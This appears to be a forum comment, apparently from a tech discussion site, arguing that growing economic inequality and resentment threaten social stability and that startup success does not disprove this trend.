See, e.g., street gangs, drug cartels, radical political- and religious movements, etc.<p>By no means am I condoning envy or a sense of entitlement; I'm just pointing out what seem to be brute facts that we have to deal with if we want to keep society viable.<p>[EDIT to respond to TomOfTTB's comment:] TomOfTTB, you're right that I'm just trying to clarify the problem.

Pretending like those few are all Zucks and Sergeys is a deliberate misreading and has nothing to do with this problem.<p>I think your reaction to this, judging from your writing, comes from the fact that you are very much surrounded in a culture of startups and tech innovation, where money is made by creating new things and expanding the pie, not reallocating its slices. That's great, but isn't a reason to deny some obvious -- and depressing -- realities about what's happening to America's social and economic fabric.<p>The tech startup scene may be a bright light in this pretty dark trend, but is not a reason to deny the trend exists.<p>Lastly, this is bad for startups.
